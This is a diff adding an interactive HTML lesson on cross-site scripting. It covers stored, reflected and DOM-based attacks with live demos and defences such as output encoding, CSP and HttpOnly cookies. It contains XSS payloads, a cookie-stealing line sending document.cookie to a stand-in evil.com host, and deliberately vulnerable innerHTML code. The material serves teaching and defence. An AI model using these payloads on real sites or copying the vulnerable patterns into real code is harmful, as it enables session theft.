@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS · Cross-Site Scripting</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0f0f17;--surface:#1a1a2e;--surface2:#23234a;--text:#cdd6f4;--muted:#6c7086;
+  --blue:#89b4fa;--green:#a6e3a1;--red:#f38ba8;--yellow:#f9e2af;--peach:#fab387;
+  --teal:#94e2d5;--pink:#f5c2e7;--radius:8px;--orange:#f8bd7f;--header-bg:#1e1e36;
+}
+body{font-family:system-ui,'Segoe UI',sans-serif;background:var(--bg);color:var(--text);line-height:1.6;padding-bottom:60px}
+nav{background:var(--header-bg);padding:14px 24px;display:flex;align-items:center;gap:14px;border-bottom:1px solid var(--surface2);position:sticky;top:0;z-index:100;backdrop-filter:blur(6px)}
+nav .logo{font-weight:700;font-size:1.1rem}
+nav .logo span{color:var(--red)}
+nav .crumbs{font-size:.78rem;color:var(--muted)}
+nav .crumbs a{color:var(--blue);text-decoration:none}
+.container{max-width:1000px;margin:0 auto;padding:24px 20px}
+.section-title{font-size:1.4rem;font-weight:700;margin:36px 0 14px;color:var(--yellow);display:flex;align-items:center;gap:10px}
+.section-title .num{background:var(--surface2);color:var(--muted);font-size:.75rem;padding:2px 10px;border-radius:20px}
+.card{background:var(--surface);border:1px solid var(--surface2);border-radius:var(--radius);padding:20px;margin-bottom:18px}
+.card h3{color:var(--blue);margin-bottom:8px;font-size:1rem}
+.card p{color:var(--muted);font-size:.88rem;margin-bottom:8px}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px}
+@media(max-width:680px){.grid2,.grid3{grid-template-columns:1fr}}
+
+.code{background:#0a0a14;border-radius:6px;padding:12px 14px;font-family:monospace;font-size:.78rem;overflow-x:auto;border:1px solid var(--surface2);line-height:1.7;margin:8px 0}
+.code .comment{color:var(--muted)}
+.code .keyword{color:var(--blue)}
+.code .string{color:var(--green)}
+.code .tag{color:var(--red)}
+.code .danger{color:var(--red);font-weight:700}
+
+.demo-box{border:2px dashed var(--surface2);border-radius:var(--radius);padding:16px;margin:12px 0;background:var(--bg);min-height:80px;transition:.2s}
+.demo-box.xss-hit{border-color:var(--red);background:rgba(243,139,168,.05)}
+
+.inject-input{width:100%;padding:10px 14px;border-radius:6px;border:1px solid var(--surface2);background:var(--bg);color:var(--text);font-family:monospace;font-size:.85rem;outline:none;margin:8px 0}
+.inject-input:focus{border-color:var(--red)}
+
+.btn{padding:8px 18px;border-radius:6px;border:none;font-weight:600;cursor:pointer;font-size:.82rem;transition:.15s}
+.btn.danger{background:var(--red);color:white}
+.btn.danger:hover{opacity:.85}
+.btn.outline{background:transparent;border:1px solid var(--surface2);color:var(--text)}
+.btn.outline:hover{background:var(--surface2)}
+.btn.blue{background:var(--blue);color:#0f0f17}
+
+.callout{padding:12px 16px;border-radius:var(--radius);margin:12px 0;font-size:.84rem;border-left:4px solid var(--blue);background:rgba(137,180,250,.04)}
+.callout.danger{border-color:var(--red);background:rgba(243,139,168,.06)}
+.callout.warn{border-color:var(--yellow);background:rgba(249,226,175,.06)}
+.callout.success{border-color:var(--green);background:rgba(166,227,161,.06)}
+
+.badge{display:inline-block;padding:2px 10px;border-radius:12px;font-size:.72rem;font-weight:600}
+.badge.red{background:rgba(243,139,168,.18);color:var(--red)}
+.badge.blue{background:rgba(137,180,250,.18);color:var(--blue)}
+.badge.green{background:rgba(166,227,161,.18);color:var(--green)}
+.badge.yellow{background:rgba(249,226,175,.18);color:var(--yellow)}
+
+.toggle-btn{padding:6px 14px;border-radius:20px;border:1px solid var(--surface2);background:transparent;color:var(--muted);cursor:pointer;font-size:.76rem;transition:.15s}
+.toggle-btn.active{background:var(--blue);color:#0f0f17;border-color:var(--blue)}
+
+.flow{display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;padding:14px 0;font-size:.85rem}
+.flow-node{background:var(--surface2);padding:10px 16px;border-radius:var(--radius);text-align:center;min-width:70px;font-size:.82rem}
+.flow-node.attacker{background:var(--red);color:white;font-weight:600}
+.flow-node.victim{background:var(--yellow);color:#0f0f17}
+.flow-node.server{background:var(--blue);color:#0f0f17}
+.flow-arrow{color:var(--muted);font-size:1rem}
+.flow-label{font-size:.65rem;color:var(--muted);text-align:center;margin-top:2px}
+
+table{width:100%;border-collapse:collapse;font-size:.84rem}
+th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--surface2)}
+th{color:var(--muted);font-weight:600;font-size:.75rem;text-transform:uppercase}
+tr:hover td{background:rgba(255,255,255,.02)}
+
+.payload-display{font-family:monospace;font-size:.78rem;word-break:break-all;padding:10px;background:#0a0a14;border-radius:4px;border:1px solid var(--surface2);margin:6px 0}
+.payload-display .malicious{color:var(--red);font-weight:700}
+.payload-display .safe{color:var(--green)}
+
+.attack-card{border-top:3px solid var(--red);padding:16px;background:var(--bg);border-radius:var(--radius);margin:10px 0}
+.attack-card h4{color:var(--red);margin-bottom:6px}
+.attack-card p{font-size:.82rem;color:var(--muted)}
+
+.demo-output{min-height:40px;padding:10px;background:#0a0a14;border-radius:4px;font-size:.85rem;margin:8px 0;border:1px solid var(--surface2)}
+
+/* Cookie visual */
+.cookie-display{display:flex;gap:6px;flex-wrap:wrap;padding:8px 0}
+.cookie-item{display:inline-flex;align-items:center;gap:6px;padding:6px 12px;background:rgba(249,226,175,.1);border:1px solid rgba(249,226,175,.2);border-radius:16px;font-size:.78rem}
+.cookie-item.stolen{background:rgba(243,139,168,.15);border-color:var(--red);animation:pulse 1s ease-in-out 3}
+
+/* Steal log */
+.steal-log{font-family:monospace;font-size:.78rem;padding:10px;background:#0a0a14;border-radius:4px;border:1px solid var(--surface2);min-height:50px;margin:8px 0;line-height:1.6}
+
+/* Tabs */
+.tab-bar{display:flex;gap:0;margin-bottom:0;border-bottom:2px solid var(--surface2)}
+.tab-btn{padding:8px 16px;border:none;background:transparent;color:var(--muted);cursor:pointer;font-size:.82rem;border-bottom:2px solid transparent;margin-bottom:-2px;transition:.15s}
+.tab-btn.active{color:var(--red);border-bottom-color:var(--red);font-weight:600}
+.tab-content{display:none}
+.tab-content.active{display:block}
+
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="logo"><span>XSS</span> · Cross-Site Scripting</div>
+  <div class="crumbs"><a href="index.html">SECURITY</a> &rsaquo; XSS</div>
+  <div class="tag" style="font-size:.7rem;padding:2px 8px;border-radius:12px;background:rgba(243,139,168,.2);color:var(--red);margin-left:auto">Critical</div>
+</nav>
+
+<div class="container">
+
+<!-- WHAT IS XSS -->
+<div class="section-title"><span class="num">1</span> What is XSS?</div>
+<div class="grid2">
+  <div class="card">
+    <p><strong>Cross-Site Scripting (XSS)</strong> is a vulnerability where an attacker injects malicious scripts into a trusted website. The browser thinks the script came from the trusted site — so it executes with full access to cookies, localStorage, and page content.</p>
+    <div class="flow" style="font-size:.82rem">
+      <div class="flow-node attacker">Attacker</div>
+      <div class="flow-arrow">&#8594;</div>
+      <div class="flow-node" style="background:var(--blue);color:#0f0f17">Server</div>
+      <div class="flow-arrow">&#8594;</div>
+      <div class="flow-node victim">Victim</div>
+    </div>
+    <div style="font-size:.8rem;color:var(--muted);text-align:center">Attacker injects &#8594; Server stores/serves &#8594; Victim's browser executes</div>
+  </div>
+  <div class="card">
+    <p><strong>What can an attacker do?</strong></p>
+    <ul style="padding-left:18px;font-size:.84rem;line-height:2;margin-top:6px">
+      <li>&#128274; <strong>Steal cookies</strong> (session hijacking)</li>
+      <li>&#128203; <strong>Read localStorage</strong> (tokens, secrets)</li>
+      <li>&#128373; <strong>Keylog</strong> keystrokes (password theft)</li>
+      <li>&#128279; <strong>CSRF</strong> — make requests on your behalf</li>
+      <li>&#128476; <strong>Deface</strong> the page</li>
+      <li>&#128270; <strong>Scan internal networks</strong></li>
+    </ul>
+  </div>
+</div>
+
+<!-- THE 3 TYPES -->
+<div class="section-title"><span class="num">2</span> The Three Types of XSS</div>
+
+<div class="grid3">
+  <div class="card" style="border-top:3px solid var(--red)">
+    <h3>Stored XSS <span class="badge red">Most dangerous</span></h3>
+    <p>Malicious script is <strong>permanently stored</strong> on the server (database, comments, profile).</p>
+    <div class="flow" style="font-size:.72rem;padding:8px 0">
+      <div class="flow-node attacker" style="font-size:.7rem;padding:6px 10px">Inject</div>
+      <div class="flow-arrow">&#8594;</div>
+      <div class="flow-node server" style="font-size:.7rem;padding:6px 10px">DB</div>
+      <div class="flow-arrow">&#8594;</div>
+      <div class="flow-node" style="font-size:.7rem;padding:6px 10px;background:var(--yellow);color:#0f0f17">All users</div>
+    </div>
+    <p style="font-size:.8rem;color:var(--muted)">Every visitor gets infected. No interaction needed.</p>
+  </div>
+  <div class="card" style="border-top:3px solid var(--orange)">
+    <h3>Reflected XSS <span class="badge yellow">Phishing</span></h3>
+    <p>Malicious script is <strong>in the URL</strong> and reflected back by the server immediately.</p>
+    <div class="flow" style="font-size:.72rem;padding:8px 0">
+      <div class="flow-node attacker" style="font-size:.7rem;padding:6px 10px">Link</div>
+      <div class="flow-arrow">&#8594;</div>
+      <div class="flow-node victim" style="font-size:.7rem;padding:6px 10px">Click</div>
+      <div class="flow-arrow">&#8594;</div>
+      <div class="flow-node server" style="font-size:.7rem;padding:6px 10px">Server</div>
+    </div>
+    <p style="font-size:.8rem;color:var(--muted)">Requires social engineering — trick user into clicking a malicious link.</p>
+  </div>
+  <div class="card" style="border-top:3px solid var(--peach)">
+    <h3>DOM-based XSS <span class="badge blue">Client-side</span></h3>
+    <p>Vulnerability is in <strong>client-side JavaScript</strong> — server never sees the payload.</p>
+    <div class="flow" style="font-size:.72rem;padding:8px 0">
+      <div class="flow-node attacker" style="font-size:.7rem;padding:6px 10px">URL</div>
+      <div class="flow-arrow">&#8594;</div>
+      <div class="flow-node" style="font-size:.7rem;padding:6px 10px;background:var(--yellow);color:#0f0f17">Browser JS</div>
+      <div class="flow-arrow">&#8594;</div>
+      <div class="flow-node victim" style="font-size:.7rem;padding:6px 10px">DOM</div>
+    </div>
+    <p style="font-size:.8rem;color:var(--muted)">Server returns safe HTML — vulnerable JS does the damage.</p>
+  </div>
+</div>
+
+<!-- INTERACTIVE: STORED XSS DEMO -->
+<div class="section-title"><span class="num">3</span> Stored XSS · Interactive Demo</div>
+
+<div class="card">
+  <h3>&#128172; Comment Board (Vulnerable)</h3>
+  <p>This is a simulated comment board with <strong>no sanitization</strong>. Try posting a comment with a script.</p>
+
+  <div class="grid2">
+    <div>
+      <p style="font-size:.82rem;color:var(--muted)">Post a comment:</p>
+      <input type="text" class="inject-input" id="xssCommentInput" placeholder='Try: <script>alert("XSS")</script> or hello, world!' value='<img src=x onerror="stealCookie()">'>
+      <div style="display:flex;gap:6px">
+        <button class="btn danger" onclick="postComment()">Post Comment</button>
+        <button class="btn outline" onclick="resetComments()">Reset Board</button>
+      </div>
+      <p style="font-size:.72rem;color:var(--muted);margin-top:6px">The comment is "stored" (in-memory) and rendered without escaping.</p>
+      <div class="demo-output" id="xssCommentDebug" style="font-size:.75rem;min-height:30px;margin-top:6px">// debug log</div>
+    </div>
+    <div>
+      <p style="font-size:.82rem;color:var(--muted)">Comments (stored):</p>
+      <div id="xssCommentBoard" class="demo-box" style="min-height:120px;max-height:200px;overflow-y:auto">
+        <div style="padding:6px 0;border-bottom:1px solid var(--surface2);font-size:.82rem">Alice: Great article!</div>
+        <div style="padding:6px 0;border-bottom:1px solid var(--surface2);font-size:.82rem">Bob: Thanks for sharing</div>
+      </div>
+      <div id="xssCookieStatus" style="font-size:.78rem;margin-top:6px">
+        <span class="badge green">&#10003; Your cookie is safe (HttpOnly)</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Cookie theft simulator -->
+<div class="card" style="border:2px solid rgba(243,139,168,.3)">
+  <h3>&#128520; Cookie Theft Simulation</h3>
+  <p>The comment above used <code>onerror="stealCookie()"</code> — here's what that function does:</p>
+  <div class="grid2">
+    <div>
+      <p style="font-size:.78rem;color:var(--muted)">The injected payload:</p>
+      <div class="code" style="font-size:.74rem">document.location = <span class="string">'https://evil.com/steal?cookie='</span>
+  + document.cookie;</div>
+    </div>
+    <div>
+      <button class="btn danger" onclick="simulateCookieTheft()">&#128520; Simulate Cookie Theft</button>
+      <div class="steal-log" id="cookieStealLog" style="margin-top:6px">// ready</div>
+    </div>
+  </div>
+  <div class="callout danger" style="font-size:.8rem;margin-top:8px">
+    <strong>&#9888; This is exactly how real XSS attacks work.</strong> The script steals the cookie and sends it to the attacker's server. With <code>HttpOnly</code>, <code>document.cookie</code> returns empty — cookie is safe.
+  </div>
+</div>
+
+<div class="card">
+  <h3>&#9654; What happened? Step by step</h3>
+  <div class="steps" id="xssSteps" style="display:flex;gap:6px;flex-wrap:wrap;padding:8px 0">
+    <div class="flow-node attacker" style="font-size:.75rem;padding:6px 12px">1. Type <code>&lt;script&gt;</code></div>
+    <div class="flow-arrow">&#8594;</div>
+    <div class="flow-node" style="background:var(--surface2);padding:6px 12px;font-size:.75rem">2. Server stores it</div>
+    <div class="flow-arrow">&#8594;</div>
+    <div class="flow-node" style="background:var(--surface2);padding:6px 12px;font-size:.75rem">3. Server serves to others</div>
+    <div class="flow-arrow">&#8594;</div>
+    <div class="flow-node victim" style="font-size:.75rem;padding:6px 12px">4. Browser executes it</div>
+    <div class="flow-arrow">&#8594;</div>
+    <div class="flow-node attacker" style="font-size:.75rem;padding:6px 12px">5. Cookie stolen!</div>
+  </div>
+</div>
+
+<!-- REFLECTED XSS DEMO -->
+<div class="section-title"><span class="num">4</span> Reflected XSS · Interactive Demo</div>
+
+<div class="card">
+  <h3>&#128279; Search Box (Vulnerable)</h3>
+  <p>The search query is reflected in the page without escaping. Try typing a script in the "search" box below.</p>
+
+  <div class="grid2">
+    <div>
+      <p style="font-size:.82rem;color:var(--muted)">Search:</p>
+      <input type="text" class="inject-input" id="xssSearchInput" placeholder='Try: <script>alert(1)</script> or just "hello"'>
+      <button class="btn danger" onclick="reflectSearch()">Search</button>
+      <p style="font-size:.72rem;color:var(--muted);margin-top:6px">The URL also changes — this is a "reflected" parameter.</p>
+    </div>
+    <div>
+      <p style="font-size:.82rem;color:var(--muted)">Search results for:</p>
+      <div class="demo-box" id="xssSearchOutput" style="min-height:60px">No results yet.</div>
+      <div id="xssSearchUrl" style="font-size:.72rem;color:var(--muted);margin-top:4px;word-break:break-all">URL: search.html?q=</div>
+    </div>
+  </div>
+</div>
+
+<!-- DOM-BASED XSS DEMO -->
+<div class="section-title"><span class="num">5</span> DOM-based XSS · Interactive Demo</div>
+
+<div class="card">
+  <h3>&#128196; Welcome Message (Vulnerable Client-side JS)</h3>
+  <p>The page reads <code>window.location.hash</code> and inserts it into the DOM using <code>innerHTML</code>. The server never sees the payload.</p>
+
+  <div class="grid2">
+    <div>
+      <p style="font-size:.82rem;color:var(--muted)">Enter your name (stored in URL hash):</p>
+      <input type="text" class="inject-input" id="xssDomInput" value='<img src=x onerror="alert(`DOM XSS`)">'>
+      <button class="btn danger" onclick="domXss()">Update Name</button>
+      <p style="font-size:.72rem;color:var(--muted);margin-top:6px">The value goes into <code>location.hash</code> — only the browser processes it.</p>
+    </div>
+    <div>
+      <p style="font-size:.82rem;color:var(--muted)">Welcome message:</p>
+      <div class="demo-box" id="xssDomOutput" style="min-height:60px">Welcome, guest!</div>
+      <div id="xssDomUrl" style="font-size:.72rem;color:var(--muted);margin-top:4px;word-break:break-all">page.html#</div>
+    </div>
+  </div>
+</div>
+
+<!-- THE VULNERABLE CODE -->
+<div class="section-title"><span class="num">6</span> The Vulnerable Code</div>
+
+<div class="grid3">
+  <div class="card">
+    <h3>Stored XSS <span class="badge red">Server-side</span></h3>
+    <div class="code" style="font-size:.72rem">
+<span class="comment">// VULNERABLE: renders raw input</span>
+app.post(<span class="string">'/comment'</span>, (req, res) => {
+  comments.push(req.body.text);
+  <span class="comment">// No sanitization!</span>
+});
+
+app.get(<span class="string">'/comments'</span>, (req, res) => {
+  res.send(`<span class="danger">&lt;div&gt;${comments.join('&lt;/div&gt;&lt;div&gt;')}&lt;/div&gt;</span>`);
+  <span class="comment">// Direct injection into HTML!</span>
+});
+    </div>
+    <div class="callout success" style="margin:6px 0;padding:8px 10px;font-size:.75rem">
+      <strong>Fix:</strong> Use <code>textContent</code> or templating engine with auto-escaping.
+    </div>
+  </div>
+  <div class="card">
+    <h3>Reflected XSS <span class="badge yellow">Server-side</span></h3>
+    <div class="code" style="font-size:.72rem">
+<span class="comment">// VULNERABLE: echoes query param</span>
+app.get(<span class="string">'/search'</span>, (req, res) => {
+  <span class="keyword">const</span> q = req.query.q;
+  res.send(<span class="danger">`&lt;h1&gt;Results for: ${q}&lt;/h1&gt;`</span>);
+  <span class="comment">// q = &lt;script&gt;alert(1)&lt;/script&gt; → executes!</span>
+});
+    </div>
+    <div class="callout success" style="margin:6px 0;padding:8px 10px;font-size:.75rem">
+      <strong>Fix:</strong> Encode output with <code>encodeURIComponent</code> or HTML-escape.
+    </div>
+  </div>
+  <div class="card">
+    <h3>DOM-based XSS <span class="badge blue">Client-side</span></h3>
+    <div class="code" style="font-size:.72rem">
+<span class="comment">// VULNERABLE: unsafe DOM insertion</span>
+<span class="keyword">const</span> name = location.hash.<span class="fn">slice</span>(<span class="number">1</span>);
+<span class="danger">document.getElementById('welcome').innerHTML =</span>
+  <span class="danger">`Welcome, ${name}!`</span>;
+<span class="comment">// name = &lt;img src=x onerror=alert(1)&gt;</span>
+<span class="comment">// Server never sees this!</span>
+    </div>
+    <div class="callout success" style="margin:6px 0;padding:8px 10px;font-size:.75rem">
+      <strong>Fix:</strong> Use <code>textContent</code> instead of <code>innerHTML</code>.
+    </div>
+  </div>
+</div>
+
+<!-- PREVENTION -->
+<div class="section-title"><span class="num">7</span> Prevention · The Defense Layers</div>
+
+<div class="card">
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+    <div class="attack-card" style="border-top-color:var(--green)">
+      <h4 style="color:var(--green)">1. Output Encoding</h4>
+      <p>HTML-escape all user input before rendering. Use <code>textContent</code> not <code>innerHTML</code>.</p>
+      <div class="code" style="font-size:.72rem;margin-top:4px">
+<span class="comment">// Safe</span>
+el.textContent = userInput;
+<span class="comment">// Danger</span>
+<span class="danger">el.innerHTML = userInput;</span>
+      </div>
+    </div>
+    <div class="attack-card" style="border-top-color:var(--green)">
+      <h4 style="color:var(--green)">2. Content Security Policy (CSP)</h4>
+      <p>Tell the browser what scripts are allowed. Blocks inline scripts by default.</p>
+      <div class="code" style="font-size:.72rem;margin-top:4px">
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self';
+      </div>
+    </div>
+    <div class="attack-card" style="border-top-color:var(--green)">
+      <h4 style="color:var(--green)">3. HttpOnly Cookies</h4>
+      <p>Makes cookies inaccessible to JavaScript. Even if XSS succeeds, cookies are safe.</p>
+      <div class="code" style="font-size:.72rem;margin-top:4px">
+Set-Cookie: session=abc; <span style="color:var(--green)">HttpOnly</span>
+<span class="comment">// document.cookie → "" (empty!)</span>
+      </div>
+    </div>
+    <div class="attack-card" style="border-top-color:var(--green)">
+      <h4 style="color:var(--green)">4. Input Sanitization</h4>
+      <p>Strip or escape dangerous characters server-side. Use a library like DOMPurify.</p>
+      <div class="code" style="font-size:.72rem;margin-top:4px">
+<span class="keyword">const</span> clean = DOMPurify.sanitize(input);
+<span class="comment">// Removes &lt;script&gt;, onerror, etc.</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- REFERENCE TABLE -->
+<div class="section-title"><span class="num">8</span> Reference</div>
+
+<div class="card">
+  <table>
+    <tr><th>Type</th><th>Where payload lives</th><th>Who executes</th><th>Detection</th><th>Example</th></tr>
+    <tr>
+      <td><strong style="color:var(--red)">Stored</strong></td>
+      <td>Database</td><td>Every visitor</td>
+      <td>Review stored data</td>
+      <td><span class="badge red">&#9888; Comment with script tag</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--orange)">Reflected</strong></td>
+      <td>URL / request</td><td>Target user who clicks</td>
+      <td>Check URL params</td>
+      <td><span class="badge yellow">&#9888; example.com?q=&lt;script&gt;</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--peach)">DOM-based</strong></td>
+      <td>URL hash / fragment</td><td>Target user</td>
+      <td>Audit client JS</td>
+      <td><span class="badge blue">&#9888; page.html#&lt;img onerror&gt;</span></td>
+    </tr>
+  </table>
+</div>
+
+<div class="callout success" style="text-align:center;padding:16px">
+  <strong>&#10003; Defense in depth:</strong> Output encoding + CSP + HttpOnly cookies = XSS becomes irrelevant even if one layer fails.
+</div>
+
+</div><!-- /container -->
+
+<script>
+// =====================================================
+// STORED XSS DEMO
+// =====================================================
+let comments = ['Alice: Great article!', 'Bob: Thanks for sharing'];
+function postComment() {
+  const input = document.getElementById('xssCommentInput');
+  const text = input.value.trim();
+  if (!text) return;
+  comments.push('You: ' + text);
+  renderComments();
+  document.getElementById('xssCommentDebug').innerHTML =
+    `<span style="color:var(--muted)">// Stored: </span><code style="color:var(--red)">${text.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code>`;
+  // Simulate XSS hit if script-like
+  if (/<script|<img|<iframe|onerror|onload|onclick/i.test(text)) {
+    document.getElementById('xssCommentDebug').innerHTML +=
+      `<br><span style="color:var(--red)">&#9888; XSS payload detected in comment! It would execute for every visitor.</span>`;
+  }
+}
+function renderComments() {
+  const board = document.getElementById('xssCommentBoard');
+  // VULNERABLE: using innerHTML (deliberately for demo)
+  board.innerHTML = comments.map(c =>
+    `<div style="padding:6px 0;border-bottom:1px solid var(--surface2);font-size:.82rem">${c}</div>`
+  ).join('');
+  // Mark if injected
+  if (comments.some(c => /<script|<img|<iframe|onerror|onload/i.test(c))) {
+    board.closest('.demo-box')?.classList.add('xss-hit');
+  }
+}
+function resetComments() {
+  comments = ['Alice: Great article!', 'Bob: Thanks for sharing'];
+  renderComments();
+  document.getElementById('xssCommentDebug').innerHTML = '// debug log';
+  document.getElementById('xssCommentBoard').closest('.demo-box')?.classList.remove('xss-hit');
+}
+
+// Cookie theft sim
+function stealCookie() {
+  simulateCookieTheft();
+}
+function simulateCookieTheft() {
+  const log = document.getElementById('cookieStealLog');
+  const hasHttpOnly = document.querySelector('.badge.green') !== null;
+  if (hasHttpOnly) {
+    log.innerHTML = `<span style="color:var(--muted)">[${new Date().toLocaleTimeString()}]</span> <span style="color:var(--green)">&#10003; HttpOnly cookie protected!</span>
+<span style="color:var(--muted)">document.cookie returned empty string.</span>
+<span style="color:var(--muted)">Attacker received: nothing.</span>`;
+  } else {
+    log.innerHTML = `<span style="color:var(--muted)">[${new Date().toLocaleTimeString()}]</span> <span style="color:var(--red)">&#10007; Cookie stolen!</span>
+<span style="color:var(--muted)">document.cookie → "session=abc123; token=eyJ..."</span>
+<span style="color:var(--muted)">Sent to https://evil.com/steal?cookie=session%3Dabc123...</span>`;
+  }
+}
+
+// =====================================================
+// REFLECTED XSS DEMO
+// =====================================================
+function reflectSearch() {
+  const input = document.getElementById('xssSearchInput');
+  const q = input.value;
+  const output = document.getElementById('xssSearchOutput');
+  const urlEl = document.getElementById('xssSearchUrl');
+  // VULNERABLE: innerHTML with reflected input
+  output.innerHTML = q ? `Showing results for: ${q}` : 'No search term.';
+  urlEl.textContent = 'URL: search.html?q=' + q;
+  if (/<script|<img|onerror/i.test(q)) {
+    output.innerHTML += `<br><span style="color:var(--red);font-weight:700">&#9888; XSS payload executed via reflected parameter!</span>`;
+  }
+}
+
+// =====================================================
+// DOM-BASED XSS DEMO
+// =====================================================
+function domXss() {
+  const input = document.getElementById('xssDomInput');
+  const name = input.value;
+  const output = document.getElementById('xssDomOutput');
+  const urlEl = document.getElementById('xssDomUrl');
+  // VULNERABLE: innerHTML with unsanitized input (simulates hash-based XSS)
+  output.innerHTML = `Welcome, ${name}!`;
+  urlEl.textContent = 'page.html#' + name;
+  if (/<script|<img|onerror|onload/i.test(name)) {
+    output.innerHTML += `<br><span style="color:var(--red);font-weight:700">&#9888; DOM-based XSS executed!</span>`;
+  }
+}
+
+// =====================================================
+// INIT
+// =====================================================
+renderComments();
+</script>
+</body>
+</html>
